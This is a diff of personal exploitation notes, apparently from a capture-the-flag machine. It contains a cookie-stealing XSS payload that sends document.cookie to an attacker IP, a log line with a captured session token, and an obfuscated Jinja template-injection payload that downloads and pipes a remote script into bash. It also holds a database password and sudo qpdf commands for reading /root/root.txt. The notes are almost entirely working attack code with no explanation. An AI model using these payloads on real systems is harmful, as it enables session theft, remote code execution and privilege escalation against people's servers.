@@ -5,7 +5,7 @@ Fix the text size when using phones
 Fix the alignment of posts when zooming in in /posts
 
 
-<img src=x onerror=fetch("http://10.10.14.142:8000/"+document.cookie);>
+<img src=x onerror=fetch("http://10.10.14.147:8000/"+document.cookie);>
 
 10.10.11.12 - - [18/May/2024 23:19:47] "GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zkgk-g.MbTH2-kmGMEb5ikxNfM305U1wZU HTTP/1.1" 404 -
 
@@ -73,6 +73,36 @@ but this does
 
 
 {%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('curl http://10.10.14.147:8000/script.sh | bash')|attr('read')()%}{%print(a)%}{%endwith%}
+
+db_config = {
+    'host': '127.0.0.1',
+    'user': 'iclean',
+    'password': 'pxCsmnGLckUb',
+    'database': 'capiclean'
+}
+
+mysql -h 127.0.0.1 -u iclean -p capiclean
+
+sudo qpdf /root/root.txt /opt/app/root.txt
+
+qpdf --empty --pages /root/root.txt -- output.pdf
+
+qpdf--add-attachment
+
+qpdf --add-attachment /root/root.txt -- - /home/flag
+
+sudo qpdf --empty rootflag.txt --qdf --add-attachment /root/root.txt --
+
+
+
+
+
+
+
+
+
+
+
 
 
 
